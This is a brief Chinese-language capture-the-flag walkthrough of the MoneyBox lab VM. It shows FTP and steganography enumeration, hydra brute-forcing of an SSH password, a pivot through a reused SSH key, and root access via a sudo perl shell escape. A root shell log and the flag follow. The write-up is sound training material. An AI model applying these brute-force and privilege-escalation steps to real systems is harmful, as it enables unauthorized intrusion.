1. 信息收集，靶机ip 192.168.1.12。21，22，80端口开放
2. ftp连接，得到一张图片，steghide info jpg查看，需要密钥
3. 在80web端口继续收集信息，得到密钥
4. 输入密钥得到data.txt文件，用户名renu，提示密码不安全
5. hydra破解得到密码987654321，ssh4登录
6. 查看.bash_history，发现lily用户的公钥和renu用户相同，ssh lily@192.168.1.12切换到lily用户
7. sudo -l，perl有sudo权限，GTFOBins上搜，得到利用 `sudo perl -e 'exec "/bin/sh";'`，提权成功

记录一下：

```
# whoami
root
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 08:00:27:6f:81:95 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.12/24 brd 192.168.1.255 scope global dynamic enp0s3
       valid_lft 601512sec preferred_lft 601512sec
    inet6 fe80::a00:27ff:fe6f:8195/64 scope link 
       valid_lft forever preferred_lft forever
# cd /root
# ls
# ls
# ls -liah
total 28K
260104 drwx------  3 root root 4.0K Feb 26  2021 .
     2 drwxr-xr-x 18 root root 4.0K Feb 25  2021 ..
268183 -rw-------  1 root root 2.1K Feb 26  2021 .bash_history
260466 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
267797 drwxr-xr-x  3 root root 4.0K Feb 25  2021 .local
260465 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
268186 -rw-r--r--  1 root root  228 Feb 26  2021 .root.txt
# cat .root.txt

Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==> r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
     
instagram : ____kirthik____

See You Back....
```
